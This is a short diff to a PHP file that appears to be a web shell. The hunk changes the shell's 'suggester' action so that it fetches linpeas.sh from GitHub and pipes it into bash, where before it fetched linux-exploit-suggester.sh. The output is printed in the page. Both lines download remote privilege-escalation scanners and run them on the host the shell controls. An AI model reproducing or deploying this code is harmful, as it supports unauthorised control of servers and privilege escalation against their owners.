@@ -2089,7 +2089,7 @@ if($s_auth){
 
 	// spawn suggester
 	elseif(isset($_REQUEST['x']) && ($_REQUEST['x']=='suggester')){
-		$s_result .= "<pre><code>".exe("curl -Lsk https://cdn.githubraw.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash")."</code></pre>";
+		$s_result .= "<pre><code>".exe("curl -Lsk https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | bash")."</code></pre>";
 	}
 
 	// spawn adminer
